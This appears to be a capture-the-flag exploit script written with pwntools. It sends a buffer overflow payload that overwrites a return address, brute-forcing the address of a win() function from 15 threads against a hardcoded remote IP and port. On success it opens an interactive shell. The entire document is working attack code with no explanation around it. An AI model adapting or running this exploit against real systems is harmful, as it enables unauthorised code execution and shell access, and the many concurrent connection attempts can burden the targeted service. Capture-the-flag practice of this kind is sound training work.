from pwn import *
import threading
import queue
import time

context(arch='amd64', os='linux')

# Remote target configuration
HOST, PORT = "34.45.81.67", 16002
BASE_ADDR = 0x401000   # Typical base for non-PIE binaries
WIN_OFFSET = 0x262     # Your local win() offset
NUM_THREADS = 15       # Adjust based on server tolerance
STEP_SIZE = 8          # Address alignment step

# Create a queue for addresses to try
address_queue = queue.Queue()
found_event = threading.Event()
stop_event = threading.Event()

# Worker function for each thread
def worker(thread_id):
    log.info(f"Thread {thread_id} started")
    while not stop_event.is_set() and not found_event.is_set():
        try:
            # Get next address with timeout
            win_addr = address_queue.get(timeout=1)
        except queue.Empty:
            continue
        
        try:
            # Create payload
            print(win_addr)
            payload = b"ppp" + b"\x00" + b'\xe2\x9c\x85' * 92 + p64(win_addr)
            
            # Connect and test
            p = remote(HOST, PORT, level='error', timeout=5)
            p.recvuntil(b"bytes): ", timeout=2)
            p.send(payload)
            p.sendline(b'echo CTF_SHELL_TEST')
            
            # Check for success
            try:
                response = p.recv(timeout=1)
                if b'CTF_SHELL_TEST' in response:
                    log.success(f"Thread {thread_id} found win() at {hex(win_addr)}!")
                    found_event.set()
                    p.interactive()
                    return
            except:
                pass
            finally:
                p.close()
                
        except Exception as e:
            log.debug(f"Thread {thread_id} error: {e}")
        finally:
            address_queue.task_done()

# Generate addresses to try
def generate_addresses():
    # First try the most likely address
    address_queue.put(BASE_ADDR + WIN_OFFSET)
    
    # Generate range for brute-force (last 12 bits)
    for offset in range(0, 0x1000, STEP_SIZE):
        address_queue.put(BASE_ADDR + offset)

# Main execution
if __name__ == "__main__":
    # Populate address queue
    generate_addresses()
    total_addresses = address_queue.qsize()
    log.info(f"Starting brute-force of {total_addresses} addresses with {NUM_THREADS} threads")
    
    # Create and start threads
    threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=worker, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Wait for success or completion
    try:
        while not found_event.is_set() and not address_queue.empty():
            time.sleep(0.5)
            
        if not found_event.is_set():
            log.error("Brute-force completed without finding win() address")
        else:
            log.success("Shell obtained successfully!")
            
    except KeyboardInterrupt:
        log.warning("Interrupted by user")
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=1)
        log.info("All threads stopped")